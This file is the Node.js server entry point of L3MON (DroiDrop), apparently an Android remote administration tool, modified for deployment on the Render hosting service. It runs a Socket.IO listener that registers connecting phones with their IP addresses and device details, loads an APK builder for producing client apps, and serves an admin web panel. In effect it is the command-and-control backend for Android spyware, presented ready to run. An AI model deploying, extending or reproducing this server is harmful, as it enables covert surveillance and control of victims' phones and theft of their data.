/*
*   DroiDrop / L3MON
*   Render-ready server version
*/

const express = require('express');
const app = express();
const IO = require('socket.io');
// const geoip = require('geoip-lite'); // Optional: can enable if needed
const CONST = require('./includes/const');
const db = require('./includes/databaseGateway');
const logManager = require('./includes/logManager');
const clientManager = new (require('./includes/clientManager'))(db);
const apkBuilder = require('./includes/apkBuilder');

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// -----------------------------
// Use dynamic ports for Render
// -----------------------------
CONST.control_port = process.env.PORT || CONST.control_port;
CONST.web_port = process.env.PORT || CONST.web_port; // Web interface on same dynamic port

// -----------------------------
// Socket.IO server
// -----------------------------
const client_io = IO.listen(app.listen(CONST.control_port));
client_io.sockets.pingInterval = 30000;

client_io.on('connection', (socket) => {
    socket.emit('welcome');
    const clientParams = socket.handshake.query;

    // Use x-forwarded-for for real IP behind Render proxy
    let clientIP = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    let clientGeo = {}; // geoip.lookup(clientIP) || {};

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });

    if (CONST.debug) {
        const onevent = socket.onevent;
        socket.onevent = function (packet) {
            const args = packet.data || [];
            onevent.call(this, packet);        // original call
            packet.data = ["*"].concat(args);
            onevent.call(this, packet);        // catch-all
        };

        socket.on("*", function (event, data) {
            console.log(event, data);
        });
    }
});

// -----------------------------
// Admin web interface
// -----------------------------
app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));

console.log(`Server is running on port ${CONST.control_port}`);
